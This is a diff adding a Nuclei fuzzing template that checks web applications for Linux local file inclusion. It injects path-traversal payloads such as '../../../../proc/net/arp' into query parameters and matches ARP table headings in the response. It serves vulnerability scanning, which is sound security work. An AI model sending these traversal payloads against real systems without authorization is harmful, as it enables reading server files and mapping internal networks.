@@ -1,0 +1,47 @@
+id: linux-lfi-fuzz-arp-table
+
+info:
+  name: Local File Inclusion via ARP Table - Linux
+  author: reewardius
+  severity: high
+  reference:
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/Intruder/directory_traversal.txt
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
+  tags: fuzzing-lfi,fuzzing-req,dast
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}'
+      
+    payloads:
+      nix_fuzz:
+        - '/proc/net/arp'
+        - '///////proc/net/arp'
+        - '../../../../../../../../../../proc/net/arp'
+        - '/../../../../../../../../../../proc/net/arp'
+        
+    fuzzing:
+      - part: query
+        type: replace
+        mode: multiple
+        fuzz:
+          - '{{nix_fuzz}}'
+          
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "address"
+          - "type"
+          - "Mask"
+          - "Device"
+        condition: and
+        
+      - type: word
+        words:
+          - "application/javascript"
+        part: header
+        negative: true
